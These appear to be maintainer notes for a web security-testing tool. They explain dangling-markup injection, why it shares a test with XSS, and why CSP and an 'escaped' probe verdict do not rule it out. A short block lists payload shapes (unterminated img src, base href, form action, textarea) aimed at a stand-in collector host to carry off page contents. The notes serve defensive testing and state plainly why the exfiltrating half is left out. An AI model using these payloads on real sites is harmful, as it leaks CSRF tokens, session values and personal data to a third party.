# Dangling markup: injection without execution

Maintainer notes, not projected. Written fresh for v2; the v1 text is not in
this repository.

## What the v1 page was

The technique for a sink that escapes `<` and `>` but not quotes, or that sits
inside an attribute the value can close. Nothing executes; the injected fragment
opens something the parser then keeps feeding until it closes, and everything in
between goes with it.

The classic shapes:

```
<img src='https://collector.example/?      <- unterminated attribute, swallows
                                              the rest of the document
<base href='https://collector.example/'>   <- every relative URL now resolves
                                              somewhere else
<form action='https://collector.example/'> <- the next submit goes elsewhere
<textarea>                                 <- consumes markup as text, including
                                              a CSRF token
```

The v1 page paired each with a collector host and told the reader to check what
arrived.

## The half the Playbook uses

The observation that this is the same class as XSS and the same test. All four
shapes require exactly what `injection.markup` requires: caller-controlled bytes
parsed as markup in the target's document. The probe answers that. It returns
`reflected` for a value in an attribute the payload closed just as it does for a
value in the body, because in both cases an `rk-probe` element was constructed.

So dangling markup does not need its own reading. It needs its own sentence in
the report, because the remediation differs: escaping `<` is enough for the XSS
half and is not enough for this one, where the quote is what matters.

The other half worth keeping is what it means when a CSP is present.
`script-src` does not stop any of the four shapes above -- none of them is a
script. A target that answered an XSS report with "our CSP blocks it" has not
answered this one.

## The half that stays out, and why

* **The collector host.** Every shape above is written to send the swallowed
  markup somewhere, and that somewhere is a server the tester runs. It receives
  whatever the document held between the injection point and the closing quote:
  CSRF tokens, personal data, a session value in a hidden field. That is
  exfiltration to an unauthorised third party, and it happens whether the reading
  meant it or not.
* **`<base href>` against a live target.** It re-points every relative URL on the
  page, including form actions and script sources, for whoever loads it.
* **Anything stored.** Same rule as the XSS note.

## The trap in the whole technique

A verdict of `escaped` from the probe means the marker came back as text. That is
the refutation for the XSS half and it is *not* automatically the refutation for
this one: a sink that HTML-encodes `<` and `>` and leaves `'` alone will return
`escaped` for a payload that begins with `<`, while a payload that begins with a
quote would still break out.

The Playbook cannot chase that with the one registered probe, and it does not
pretend to. What it does is say so: an `escaped` verdict on a value that lands
inside an attribute is a refutation of markup construction and is `inconclusive`
about attribute breakout. The follow-up is a person reading the captured document
and deciding whether the quote survived.
